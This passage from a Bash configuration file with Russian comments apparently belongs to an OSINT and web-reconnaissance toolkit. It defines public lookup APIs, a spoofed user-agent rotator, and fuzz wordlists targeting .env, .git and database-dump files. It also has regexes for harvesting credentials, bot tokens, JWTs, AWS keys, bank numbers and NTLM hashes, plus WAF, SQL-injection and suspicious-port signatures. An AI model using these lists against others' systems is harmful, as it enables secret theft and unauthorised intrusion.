    # --- Ethereum Сеть (ETH / ERC-20 / EVM RPC Infrastructure) ---
    "https://rpc.ankr.com/eth|POST|JSON|ETH|Ankr EVM High-Performance RPC"
    "https://ethereum-rpc.publicnode.com|POST|JSON|ETH|PublicNode Decentralized EVM Gateway"
    
    # --- TRON Сеть (TRX / TRC-20 / TRON-EVM Infrastructure) ---
    "https://apilist.tronscan.org/api/account?address={ADDRESS}|GET|JSON|TRX|TronScan Core Ledger"
    "https://api.trongrid.io/v1/accounts/{ADDRESS}|GET|JSON|TRX|TronGrid Official Border Node"
)

# ==============================================================================
# 5. ИНТЕЛЛЕКТ ДОМЕННЫХ ИМЕН, DNS И СЕРВЕРОВ (ULTIMATE DOMAIN & DNS INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {DOMAIN} и {IP} автоматически заменяются сигнатурным ядром.
GLOBAL_API_DOMAIN_NODES=(
    # --- Высокопроизводительные DoH-декодеры (DNS Over HTTPS Core) ---
    "https://dns.google/resolve?name={DOMAIN}&type=ANY|GET|JSON|DOMAIN|Google Secure DoH Core"
    "https://cloudflare-dns.com/dns-query?name={DOMAIN}&type=ANY|GET|DNS_JSON|DOMAIN|Cloudflare Quad1 DoH Gateway"
    
    # --- Проверка регистрационных данных и возраста домена (WHOIS / RDAP) ---
    "https://rdap.org/domain/{DOMAIN}|GET|JSON|DOMAIN|ICANN RDAP International Registry"
    
    # --- Пассивный поиск субдоменов и OSINT сертификатов (Certificate Transparency) ---
    "https://crt.sh/?q={DOMAIN}&output=json|GET|JSON|DOMAIN|COMODO Certificate Transparency Ledger"
    
    # --- Реверсивный DNS-трекинг инфраструктуры (Reverse DNS) ---
    "https://api.viewdns.info/reversedns/?ip={IP}&output=json|GET|JSON|IP|ViewDNS Infrastructure Matrix"
)

# ==============================================================================
# 6. МЕТАДАННЫЕ, СОЦСЕТИ И ПОИСК СВЯЗЕЙ (ULTIMATE SOCIAL IDENTITY INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {USER} автоматически заменяется очищенным никнеймом или идентификатором.
GLOBAL_API_IDENTITY_NODES=(
    # --- Профессиональный и разработческий цифровой след (Dev Intel) ---
    "https://api.github.com/users/{USER}|GET|JSON|USER|GitHub Developer Core API"
    "https://api.github.com/users/{USER}/events/public|GET|JSON|USER|GitHub Public Activity Tracker"
    
    # --- Архивный цифровой след и история изменений (Wayback Machine) ---
    "https://archive.org/advancedsearch.php?q=creator%3A%22{USER}%22&output=json|GET|JSON|USER|Wayback Machine Meta-Archive"
    "https://web.archive.org/cdx/search/cdx?url=*.{USER}*&output=json&limit=50|GET|JSON|DOMAIN|Wayback Machine URL Indexer"
    
    # --- Публичные метаданные мессенджеров и платформ (Public Web OSINT) ---
    "https://t.me/s/{USER}|GET|HTML|USER|Telegram Channel/Profile Web Stream"
    "https://boards-api.greenhouse.io/v1/boards/{USER}/jobs|GET|JSON|USER|Greenhouse Corporate Job Boards"
)


# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации Email
# ==============================================================================
GLOBAL_REGEX_EMAIL="\b[a-z0-9._%+-]+@([a-z0-9-]+\.)+[a-z]{2,63}\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации телефонов
# ==============================================================================
GLOBAL_REGEX_PHONE="(?i)(?:\+?([0-9]{1,4})[\s.-]?)?(?:\([0-9]{1,5}\)[\s.-]?)?([0-9]{2,5}[\s.-]?){2,5}[0-9]{2,5}"

# ==============================================================================
# GLOBAL VALIDATION & OSINT PHONENUMBER MATRICES
# ==============================================================================

# 1. Мощная ПОИСКОВАЯ матрица (Твой паттерн, адаптированный под кросс-платформенный POSIX ERE для grep/Bash)
# Используется для форензики, парсинга логов и поиска упоминаний номеров в текстах.
GLOBAL_REGEX_PHONE_SEARCH="(\+?([0-9]{1,4})[[:space:]\.-]?)?(\([0-9]{1,5}\)[[:space:]\.-]?)?([0-9]{2,5}[[:space:]\.-]?){2,5}[0-9]{2,5}"

# 2. Строгая ВАЛИДИРУЮЩАЯ матрица ядра
# Используется перед отправкой в сетевые OSINT-запросы, проверяя, что строка полностью очищена до цифр.
GLOBAL_REGEX_PHONE_VALID="^[0-9]{7,15}$"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска IPv4/IPv6 и CIDR
# ==============================================================================
GLOBAL_REGEX_IP="(?i)\b(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(/[0-9]{1,2})?|([0-9a-f]{1,4}:){1,7}:?([0-9a-f]{1,4})?(:[0-9a-f]{1,4}){1,7}(/[0-9]{1,3})?)\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации доменов
# ==============================================================================
GLOBAL_REGEX_DOMAIN="(?i)\b((xn--[a-z0-9-]{1,59}|[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)\.)+([a-z]{2,63}|xn--[a-z0-9-]{1,59})\b"


# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации IBAN
# ==============================================================================
GLOBAL_REGEX_IBAN="(?i)\b[a-z]{2}[0-9]{2}([a-z0-9]\s*){10,30}[a-z0-9]\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации RIB (FR)
# ==============================================================================
GLOBAL_REGEX_RIB="(?i)\b[0-9]{5}[\s.-]?[0-9]{5}[\s.-]?[a-z0-9]{11}[\s.-]?[0-9]{2}\b"

# Сигнатурный разделитель метаданных в системных логах (Loot Splitting Pattern)
GLOBAL_REGEX_BRIDGE_DELIMITER=" -> "


# ==============================================================================
# 12. МАТРИЦА ЛЕГИТИМНЫХ ОКРУЖЕНИЙ И USER-AGENTS (ULTIMATE UA ROTATOR)
# ==============================================================================
GLOBAL_NETWORK_UA=(
    # --- Windows 11 / Современные браузеры (Corporate Desktop Standard) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Edge/124.0.0.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- macOS / Apple экосистема (Premium Consumer Segment) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
    
    # --- Linux / Профессиональные рабочие станции (Developer/Sysadmin Trace) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- Мобильный трафик (Mobile Mesh / High-Trust Bypassing) ---
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/605.1.15"
)
# ==============================================================================
# МАТРИЦЫ ДЛЯ АНАЛИЗА ИНФРАСТРУКТУРЫ И АРТЕФАКТОВ (INFRASTRUCTURE & STATIC CORE)
# ==============================================================================
# ==============================================================================
# @description: Ультимативный паттерн поиска веб-документов и системных секретов
# ==============================================================================
GLOBAL_REGEX_WEB_EXTENSIONS='\b[a-zA-Z0-9_\/\.-]+\.(php|php[0-9]|aspx?|jspx?|pdf|docx?|xlsx?|zip|gz|tar\.gz|tgz|rar|sql|db|sqlite|env|htaccess|htpasswd|bak|old|swp|log|conf|ini|json|ya?ml|git|key|pem|crt)\b'

# Точечный паттерн для мгновенной классификации критических утечек и секретов
GLOBAL_REGEX_CRITICAL_EXTS="\.(env|bak|sql|htaccess|git|conf|key|pem|htpasswd|old|swp|db|sqlite)$"

# ==============================================================================
# МАТРИЦЫ ДЛЯ АНАЛИЗА ИНФРАСТРУКТУРЫ И АРТЕФАКТОВ (INFRASTRUCTURE & STATIC CORE)
# ==============================================================================

# 1. Максимальный паттерн детекции исполняемых веб-скриптов и динамических страниц
GLOBAL_REGEX_WEB_SCRIPTS="\.(php[0-9]?|phtml|phar|aspx?|ashx|asmx|axd|jspx?|do|action|cgi|pl|pyc?|rb|sh|bat|cmd|go|rs|js|ts|xsjs|pws|cfm|dll|so|exe)$"

# 2. Сигнатурная матрица детекции заглушек хостинга, стандартных ошибок и ложных ответов (Анти-Мусор)
GLOBAL_REGEX_HOSTING_WASTE="(<html>|40[0-9] (Forbidden|Not Found|Bad Request|Unauthorized)|50[0-9] (Bad Gateway|Internal Server Error|Service Unavailable)|InfinityFree|Hostinger|Cloudflare|Cloudfront|Sucuri|Incapsula|Under Construction|Site Built With|Powered by cPanel|Plesk|Default Web Site|Welcome to nginx|Apache/|LiteSpeed|IIS/|Tomcat|Jetty|WebSphere|Oracle-HTTP-Server|Phusion Passenger|404 Page)"
# ==============================================================================
# 5. СЛОВАРЬ ФАЗЗИНГА ЧУВСТВИТЕЛЬНЫХ ТОЧЕК И АРТЕФАКТОВ (ULTIMATE FUZZ WORDLIST)
# ==============================================================================
GLOBAL_FUZZ_WORDLIST=(
    # --- Ядро окружения и секреты (Environment & Secrets) ---
    ".env"
    ".env.local"
    ".env.production"
    ".env.stage"
    ".env.bak"
    ".env.old"
    "config.env"
    
    # --- Конфигурации и Веб-серверы (Configurations & Web Servers) ---
    ".htaccess"
    ".htpasswd"
    "web.config"
    "nginx.conf"
    "config.php"
    "config.inc.php"
    "config.json"
    "wp-config.php"
    "wp-config.bak"
    "configuration.php"
    "settings.py"
    "application.properties"
    "application.yml"
    
    # --- Репозитории и CI/CD оркестрация (Repositories & CI/CD) ---
    ".git/HEAD"
    ".git/config"
    ".git/index"
    ".gitignore"
    ".svn/entries"
    "docker-compose.yml"
    "Dockerfile"
    ".gitlab-ci.yml"
    "jenkins.xml"
    "package.json"
    
    # --- Дампы баз данных и бэкапы (Database Dumps & Backups) ---
    "backup.sql"
    "database.sql"
    "dump.sql"
    "db.sql"
    "mysql.sql"
    "data.sqlite"
    "backup.zip"
    "backup.tar.gz"
    "backup.rar"
    "site.zip"
    "www.zip"
    "html.zip"
    "archive.zip"
    "config.php.bak"
    "config.php.old"
    "index.php.bak"
    "index.php.old"
    
    # --- Логи и Отладка (Logs, Debugging & Panel Entrances) ---
    "phpinfo.php"
    "info.php"
    "test.php"
    "debug.log"
    "error.log"
    "access.log"
    "laravel.log"
    "pm2.log"
    "cron.log"
    "status"
    "server-status"
)

# ==============================================================================
# @description: Ультимативные сигнатуры для статического анализа (PE/ELF/Logs)
# ==============================================================================
GLOBAL_STATIC_SIGNATURES="(https?|ftp|sftp|ws|wss):\/\/[^\s\"'\`>]+|\/etc\/(passwd|shadow|issue|hostname|resolv\.conf)|\/proc\/(self|net|version)|\b(cmd\.exe|powershell\.exe|sh|bash|zsh|csh|tcsh|wscript\.exe|cscript\.exe|rundll32\.exe|regsvr32\.exe)\b|\b(Authorization|Bearer|X-API-Key|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|token|secret_key|api_key|passwd|password|private_key|id_rsa|ssh-rsa)\b|VirtualAlloc|VirtualProtect|IsDebuggerPresent|CheckRemoteDebuggerPresent|GetProcAddress|LoadLibraryA|system|execve|popen|fork"

# --- Расширенные сигнатуры глубокого анализа (Deep Forensics & OSINT RegEx) ---
# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска пар email:pass и login:pass
# ==============================================================================
GLOBAL_REGEX_CREDENTIALS="(?i)\b([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}|[a-z0-9_.-]{3,32}):[^[:space:]]{3,64}\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации IPv6 (RFC 5952)
# ==============================================================================
GLOBAL_REGEX_IPV6="(?i)\b(((?=(?:.*:){7})[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){7})|((?=(?:.*:){1,6})[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){1,6}|)(?:::(?:[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){1,6}|))|(?:::(?:[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){0,6})?))\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации MAC-адресов (IEEE 802)
# Supports: 00:11:22:33:44:55, 00-11-22-33-44-55, 0011.2233.4455, 001122334455
# ==============================================================================
GLOBAL_REGEX_MAC="(?i)\b(([0-9a-f]{2}(:)[0-9a-f]{2}(\4[0-9a-f]{2}){4})|([0-9a-f]{2}(-)[0-9a-f]{2}(\7[0-9a-f]{2}){4})|([0-9a-f]{4}\.[0-9a-f]{4}\.[0-9a-f]{4})|([0-9a-f]{12}))\b"

# ==============================================================================
# @description: Ультимативные паттерны для детекции и сепарации 32-символьных хэшей
# ==============================================================================
# Базовый сырой хэш (строго 32 символа Hex)
GLOBAL_REGEX_HASH_32_HEX="(?i)\b[a-f0-9]{32}\b"

# Сигнатурный контекст MD5: хэширование пустых строк, соли или маркеры бэкенда
GLOBAL_SIG_HASH_MD5_MARKERS="(?i)(md5|password_hash|wp_|user_pass)"

# Сигнатурный контекст NTLM: разделители учетных записей Windows (UID:RID:LM:NTLM)
GLOBAL_SIG_HASH_NTLM_MARKERS=":[0-9a-f]{32}:[0-9a-f]{32}\b|:[a-f0-9]{32}$"


# ==============================================================================
# @description: Ультимативные паттерны криптографии, бот-менеджмента и JWT Intel
# ==============================================================================

# --- Криптография: Хэш-функции и приватные ключи (64 символа Hex) ---
GLOBAL_REGEX_HASH_SHA256="(?i)\b[a-f0-9]{64}\b"
GLOBAL_SIG_CRYPTO_KEY_MARKERS="(?i)(private_key|secret|wallet|priv|privkey|signing)"

# --- Разведка: Токены управления Telegram-ботов (Поддержка ID нового поколения) ---
# Бесшовно обрабатывает ID от 8 до 15 знаков внутри любого текстового массива/JSON
GLOBAL_REGEX_TG_TOKEN="(?i)\b[0-9]{8,15}:[A-Za-z0-9_-]{35}\b"

# --- Разведка: Веб-токены JWT (RFC 7519 Base64URL Strict Compliance) ---
# Гарантирует наличие трех зон (Header.Payload.Signature) без ложных срабатываний
GLOBAL_REGEX_JWT="\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"

# Пример того, как легко ты сможешь масштабировать этот блок в будущем:
GLOBAL_REGEX_DISCORD_TOKEN="\b[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}\b"
GLOBAL_REGEX_AWS_KEY="\bAKIA[A-Z0-9]{16}\b"


# ==============================================================================
# --- 3. ГЛОБАЛЬНЫЕ СУПЕР-КОМПОЗИТЫ (ОПТИМИЗАЦИЯ ПОТОКА) ---
# ==============================================================================
# Проверка одного супер-композита в цикле заменяет собой пачку раздельных проверок

# Объединенный крипто-след (MD5 / NTLM / SHA-256 / Private Keys)
GLOBAL_SUPER_REGEX_CRYPTO="($GLOBAL_REGEX_HASH_32_HEX|$GLOBAL_REGEX_HASH_SHA256)"

# Объединенный шлюз инфраструктурных доступов (JWT / Telegram Bot API)
GLOBAL_SUPER_REGEX_TOKENS="($GLOBAL_REGEX_TG_TOKEN|$GLOBAL_REGEX_JWT)"

# Объединенный сетевой стек (IPv4 / IPv6 / MAC / Domain)
# Настраивается путем слияния твоих базовых сетевых регулярных выражений
GLOBAL_SUPER_REGEX_INFRA="($GLOBAL_REGEX_IP|$GLOBAL_REGEX_MAC|$GLOBAL_REGEX_DOMAIN)"


# --- Сигнатуры эвристического движка анализа уязвимостей (Exploiter Engine Signatures) ---
# ==============================================================================
# 6. СИГНАЛЫ ПРИСУТСТВИЯ WAF И ЗАЩИТНЫХ СИСТЕМ (ULTIMATE WAF CORE)
# ==============================================================================
GLOBAL_SIG_WAF="(?i)(cloudflare|akamai|sucuri|incapsula|imperva|barracuda|f5_big-ip|mod_security|comodo|radware|fortigate|wordfence|asm|citrix|aws-waf|cloudfront|edgesuite|fastly|stackpath|__cfuid|cf-ray|cf-cache-status|x-sucuri-id|x-protected-by|x-waf-|x-cdn|err_connection_refused|captcha-bypass|challenge-platform|429 too many requests|block_id|security_challenge)"

# ==============================================================================
# 7. СИГНАЛЫ СТРУКТУРЫ ДЛЯ АКТИВАЦИИ SQL-ENGINE (ULTIMATE STRUCTURE MATRIX)
# ==============================================================================
GLOBAL_SIG_WEB_STRUCTURE="(?i)(\b(id|uid|uuid|p|page|cat|category|sec|section|art|article|post|prod|product|item|file|doc|lang|action|act|mode|view|search|q|query|sort|order|by|limit|offset|from|to|start|end|file_id|user_id|group_id|token_id|hash|data|payload|json|xml|ajax)\b\s*=|(\/api\/(v[0-9]|v1|v2|v3)\/[a-zA-Z0-9_-]+\/[0-9]+)|\b(select|insert|update|delete|drop|alter|union|where|having|orderby|groupby|into|load_file|benchmark|sleep|md5|sha1|concat)\b|\b(graphql|query\s*\{|\"query\"\s*:|mutation\b|\$gql))"


# ==============================================================================
# 8. СИГНАЛЫ ВЫЯВЛЕНИЯ КРИТИЧЕСКИХ АНОМАЛИЙ И УЯЗВТИМОСТЕЙ (ULTIMATE ALERTS)
# ==============================================================================
GLOBAL_SIG_VULN_ALERTS="(?i)(\b(vulnerable|exploit_matched|rce_triggered|shell_spawned|privilege_escalation|unauthenticated|auth_bypass|remote_code_execution|buffer_overflow|segmentation_fault|core_dumped|access_denied|permission_denied)\b|\bcve-[0-9]{4}-[0-9]{4,7}\b|\b(sql_error|syntax_error|mariadb|postgresql|sqlite|oracle_error|unhandled_exception|stack_trace|fatal_error|null_pointer)\b|\b(lfi|rfi|ssrf|xxe|deserialization|command_injection|path_traversal)\b)"


# --- Сигнатуры для сбора информации и разведки вебхуков (Recon & Webhook Signatures) ---
# ==============================================================================
# 9. СИГНАТУРЫ АКТИВНЫХ ИНТЕРПРЕТАТОРОВ И СЛУЖБ (ULTIMATE RUNTIMES MATRIX)
# ==============================================================================
GLOBAL_SIG_WEB_RUNTIMES="(?i)\b(python([0-9](\.[0-9]+)?)?|node([0-9]+)?|php(-fpm)?([0-9](\.[0-9]+)?)?|go|ruby([0-9](\.[0-9]+)?)?|java|perl|dotnet|nginx|apache[0-9]?|httpd|lighttpd|caddy|traefik|gunicorn|uwsgi|puma|unicorn|passenger|tomcat|jetty|wildfly|glassfish|docker(-containerd|-current)?|dockerd|podman|containerd|kubelet|hypercorn|uvicorn|daphne)\b"


# ==============================================================================
# 10. СЛОВАРЬ ФАЗЗИНГА ВЕБХУКОВ И API ЭНДПОИНТОВ (ULTIMATE WEBHOOK WORDLIST)
# ==============================================================================
GLOBAL_WEBHOOK_WORDLIST=(
    # --- Версионированные API и Точки Входа (Core API Routs) ---
    "api"
    "api/v1"
    "api/v2"
    "api/v3"
    "api/v4"
    "rest/v1"
    "rest/v2"
    "v1/api"
    "v2/api"
    "graphql"
    "api/graphql"
    
    # --- Универсальные Вебхуки (Generic Webhooks) ---
    "webhook"
    "webhooks"
    "hooks"
    "hook"
    "api/webhook"
    "api/webhooks"
    "api/hooks"
    "v1/webhooks"
    "v2/webhooks"
    "webhooks.json"
    "webhook.php"
    
    # --- Мессенджеры и Чат-боты (Messengers & Bots) ---
    "tg-hook.php"
    "telegram-webhook"
    "telegram/webhook"
    "api/telegram"
    "slack-hook"
    "slack/webhook"
    "api/slack"
    "discord-webhook"
    "discord/webhook"
    "teams-webhook"
    
    # --- Финансовые и Платежные Шлюзы (FinTech & Payment Gateways) ---
    "stripe-webhook"
    "stripe/webhook"
    "api/stripe"
    "paypal-webhook"
    "paypal/webhook"
    "api/paypal"
    "braintree-webhook"
    "razorpay-webhook"
    "shopify-webhook"
    "shopify/webhook"
    
    # --- Разработка, CI/CD и Облака (DevOps & Cloud Providers) ---
    "git-hook"
    "github-webhook"
    "github/webhook"
    "gitlab-webhook"
    "gitlab/webhook"
    "bitbucket-webhook"
    "jenkins-webhook"
    "jira-webhook"
    "aws-webhook"
    "firebase-webhook"
    
    # --- CRM, Маркетинг и Телефония (SaaS, Marketing & Telephony) ---
    "mailchimp-webhook"
    "sendgrid-webhook"
    "twilio-webhook"
    "twilio/webhook"
    "hubspot-webhook"
    "hubspot/webhook"
    "amocrm-webhook"
    "bitrix-webhook"
)


# ==============================================================================
# @description: Ультимативный паттерн поиска скрытых сетей и Web3-маршрутов
# ==============================================================================
GLOBAL_REGEX_DARKWEB="(?i)(\b[a-z2-7]{56}\.onion\b|\b[a-z0-9]{52}\.b32\.i2p\b|\b[a-z0-9_-]+\.i2p\b|\b[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}\b|(\.bit|\.lib|\.coin|\.bazar|\.emc|\.onion|\.i2p|\.ygg)\b)"


# ==============================================================================
# SYSTEM CORE: СИСТЕМНЫЕ ЛИМИТЫ И ИНТЕРФЕЙСЫ БЕЗОПАСНОСТИ
# ==============================================================================

# Динамический регулятор числовых диапазонов меню (Лимит по умолчанию)
# Используется как дефолтный extra-параметр для валидатора "range"
GLOBAL_CORE_MENU_MAX_LIMIT=99

# ==============================================================================
# @description: Ультимативная матрица валидации защищенных интерфейсов (Privacy Layer)
# Защищает ядро от False Positive совпадений и покрывает стек протоколов 2026 года.
# ==============================================================================
GLOBAL_REGEX_PRIVACY_INTERFACES="(?i)\b(tun[0-9]*|ppp[0-9]*|wg[0-9]*|wireguard[0-9]*|tap[0-9]*|csc[0-9]*|fct[0-9]*|forti[a-z]*|nordlynx|xvpn|tailscale[0-9]*|zt[0-9]*|zerotier|proton[a-z]*|anyconnect|sing-?tun|clash-?tun|xray-?tun|vtun[0-9]*)\b"

# ==============================================================================
# SYSTEM CORE: АТОМАРНЫЕ СИСТЕМНЫЕ И ЛОГИЧЕСКИЕ ВАЛИДАТОРЫ
# ==============================================================================
# Строгая проверка на чистое положительное целое число (Integer)
GLOBAL_REGEX_DIGIT="^[0-9]+$"



# ==============================================================================
# @description: Ультимативная супер-матрица инфраструктурной разведки (OSINT Layer)
# Мультиязычный бронированный композит для снайперского парсинга WHOIS-данных.
# Покрывает международные, национальные (ccTLD) и новые (gTLD) зоны по состоянию на 2026 год.
# ==============================================================================
GLOBAL_SIG_WHOIS_MATRIX="(?i)(registrar|reg-name|sponsoring|org|organization|registrant|admin[-_ ]city|admin[-_ ]country|country|c:|co:|expires|expired|exp-date|paid-till|validity|free-date|created|creation[-_ ]date|registered|reg-date|changed|modified|updated|nserver|name[-_ ]server|ns[0-9]*|person|descr|tech-id|mnt-by|status|state|registrant[-_ ]email|e-mail|privat[a-z]*|protect[a-z]*|gdpr|redacted|anonymous)"


# ==============================================================================
# OSINT CORE: УЛЬТИМАТИВНЫЕ МАТРИЦЫ АНАЛИЗА HTTP/HTTPS И СЕТЕВЫХ ЗАГОЛОВКОВ
# Максимально полный мультиязычный стек паттернов для глубокой разведки (2026)
# ==============================================================================

# 1. Матрица определения серверного ПО и балансировщиков (Инфраструктурный слой)
# Перехватывает не только классический Server, но и прокси, шлюзы, CDN и контроллеры ingress
GLOBAL_REGEX_HTTP_SERVER="(?i)^(server|via|x-asf-by|x-powered-by-plesk|x-advertising|x-responder|x-served-by|x-cached-by|x-cache|x-edge-location|x-amz-server-side-encryption|x-kong-proxy-latency|x-envoy-upstream-service-time|cf-ray|kiwi-id)"

# 2. Матрица версий, фреймворков и бэкенд-сред выполнения (Runtime Layer)
# Содержит маркеры CMS, языков программирования, фреймворков, шаблонизаторов и серверов приложений
GLOBAL_REGEX_HTTP_RUNTIME="(?i)^(x-powered-by|x-runtime|x-version|x-aspnet-version|x-aspnetmvc-version|x-cocoa-version|x-generator|x-cms|x-nextjs-cache|x-nuxt-cache|x-redirected-by|x-framework|x-application-context|wp-super-cache|x-drupal-cache|x-varnish)"

# 3. Ультимативная матрица аудита заголовков безопасности и приватности (Security Shield)
# Покрывает все современные политики контроля доступа, изоляции контекста и защиты от эксплуатации
GLOBAL_REGEX_HTTP_SECURITY="(?i)^(content-security-policy|content-security-policy-report-only|x-frame-options|x-content-type-options|strict-transport-security|x-xss-protection|x-permitted-cross-domain-policies|referrer-policy|permissions-policy|clear-site-data|cross-origin-embedder-policy|cross-origin-opener-policy|cross-origin-resource-policy|expect-ct|access-control-allow-origin|access-control-allow-credentials|access-control-allow-headers|access-control-allow-methods)"

# 4. Матрица детекции служебных параметров, статус-кодов и сетевого состояния
GLOBAL_REGEX_HTTP_STATUS="(?i)^http/"

# ==============================================================================
# OSINT CORE: УЛЬТИМАТИВНАЯ МАТРИЦА СЕССИОННЫХ ДЕСКРИПТОРОВ (Cookie & Session Layer)
# Максимально полный перехват векторов авторизации, трекеров и сессионных токенов.
# Покрывает стандарты RFC 6265, JWT, OAuth, а также кастомные заголовки WAF/CDN (2026).
# ==============================================================================
GLOBAL_REGEX_HTTP_COOKIE="(?i)^(set-cookie|cookie|cookie2|x-xsrf-token|x-csrf-token|authorization|proxy-authorization|x-auth-token|x-session-id|x-request-id|cf-mitm-auth|cf-access-authenticated-user-email|x-amz-security-token|x-amzn-trace-id|ak_bmsc|bm_sv)"


# ==============================================================================
# OSINT WHOIS LAYER: АТОМАРНЫЕ СУПЕР-МАТРИЦЫ ИНФРАСТРУКТУРНОЙ РАЗВЕДКИ
# Полноценная изоляция текстовых шаблонов для мультиязычного парсинга (2026)
# ==============================================================================

# 1. Данные регистратора, организаций, провайдеров и ответственных лиц
GLOBAL_REGEX_WHOIS_REG="(registrar|reg-name|sponsoring|org|organization|registrant|person|descr|tech-id|mnt-by)"

# 2. Метки жизненного цикла инфраструктуры (Временные маркеры и даты)
GLOBAL_REGEX_WHOIS_DATES="(expires|expired|exp-date|paid-till|validity|free-date|created|creation[-_ ]date|registered|reg-date|changed|modified|updated)"

# 3. Маршрутизация DNS-серверов и узлов делегирования трафика
GLOBAL_REGEX_WHOIS_NS="(nserver|name[-_ ]server|ns[0-9]*)"

# 4. Детекция слоев приватности, GDPR-заглушек и обфускации владельца
GLOBAL_REGEX_WHOIS_PRIVACY="(privat[a-z]*|protect[a-z]*|gdpr|redacted|anonymous)"

# Сводный композит для первичной фильтрации потока (Объединяет все атомарные матрицы)
GLOBAL_SIG_WHOIS_MATRIX="(?i)(${GLOBAL_REGEX_WHOIS_REG}|${GLOBAL_REGEX_WHOIS_DATES}|${GLOBAL_REGEX_WHOIS_NS}|${GLOBAL_REGEX_WHOIS_PRIVACY})"


# ==============================================================================
# FORENSIC & PURGE LAYER: ГЛОБАЛЬНЫЕ МАТРИЦЫ АВТОНОМНОЙ ЗАЩИТЫ (УЛЬТИМАТИВНЫЕ)
# Максимально полный стек регулярных паттернов для Incident Response и зачистки (2026)
# ==============================================================================

# 1. Строгие паттерны детекции аномальных, зависших и деструктивных статусов процессов
# Z (Zombie), D (Uninterruptible Sleep / Вредоносный I/O или Лок), T (Stopped), t (Traced / Отладка под малварью)
GLOBAL_REGEX_BAD_PROC_STATUS="^[ZDTt]$"

# 2. Индустриальный белый список процессов, критической инфраструктуры и системных демонов
# ЗАПРЕЩЕНО трогать во избежание мгновенного краха ядра OS, SSH-сессий, контейнеров и шины управления
GLOBAL_REGEX_PROC_WHITELIST="(?i)^(systemd|init|sshd|bash|sh|zsh|tmux|screen|adb|dockerd|containerd|podman|kthreadd|kworker.*|ksoftirqd.*|migration.*|rcu_sched|auditd|rsyslogd|systemd-journald|dbus-daemon|udevd|agetty|login)$"

# 3. Максимальная матрица вредоносных, теневых и атакующих портов (Danger Network Perimeter)
# Покрывает: Метасплоит, дефолтные RAT, криптомайнеры, бэкдоры, туннели (Ngrok/Chisel) и командные центры (C2)
GLOBAL_REGEX_DANGER_PORTS="^(4444|55555|6666|7777|8888|9999|31337|1337|9001|8080|4443|65534|2022|8000|1080|5000|54321|4000|4545|8333|14337)$"

# 4. Белый список портов управления, жизнеобеспечения и авторизованного доступа
# Блокировка этих портов гарантирует моментальную потерю контроля над целевой системой (22: SSH, 80/443: Web, 5037/5555: ADB шина)
GLOBAL_REGEX_PORT_WHITELIST="^(22|80|443|5037|5555|2376|6443|9100)$"

# 5. Ультимативная сигнатурная маска критических системных файлов, баз данных и логов
# ЗАПРЕЩЕНО перемещать в карантин, так как их удаление/блокировка разрушит ОС или затрет форензик-след для суда
GLOBAL_REGEX_QUARANTINE_WHITELIST="(?i)\.(conf|lock|uuid|db|sqlite|passwd|shadow|journal|log|key|crt|pem|fstab|modules|enviroment)$"


# ==============================================================================
# NETWORK INTELLIGENCE LAYER: ГЛОБАЛЬНЫЕ МАТРИЦЫ СЕТЕВОГО АУДИТА (УЛЬТИМАТИВНЫЕ)
# Конфигурация гибридного сканирования, обхода систем фильтрации и OSINT-топологии
# ==============================================================================

# 1. Отказоустойчивый резервный диапазон (Дефолтная маска внутренней инфраструктуры)
GLOBAL_NET_FALLBACK_RANGE="192.168.1.0/24"

# 2. ПРИВИЛЕГИРОВАННЫЙ РЕЖИМ ЯДРА (ROOT-ДОСТУП) — МАКСИМАЛЬНЫЙ СТЕК АТАК
